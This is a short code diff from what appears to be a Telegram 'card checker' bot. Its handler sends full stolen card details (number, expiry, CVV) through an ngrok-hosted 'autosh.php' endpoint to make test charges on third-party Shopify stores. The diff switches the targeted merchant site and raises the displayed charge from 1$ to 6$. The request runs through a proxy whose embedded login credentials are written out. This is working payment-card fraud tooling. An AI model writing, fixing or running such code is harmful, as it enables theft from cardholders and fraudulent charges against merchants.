@@ -2629,7 +2629,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         api_url = (
             f"https://7feeef80303d.ngrok-free.app/autosh.php"
             f"?cc={cc}|{mm}|{yy}|{cvv}"
-            "&site=https://radiclerootsfarm.com"
+            "&site=https://tackletech3d.com"
             "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
@@ -2685,7 +2685,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         formatted_msg = (
             f"═══[ <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬</b> ]═══\n"
             f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{card}</code>\n"
-            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 1$💸\n"
+            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 6$💸\n"
             f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{response}</i>\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ {brand}\n"
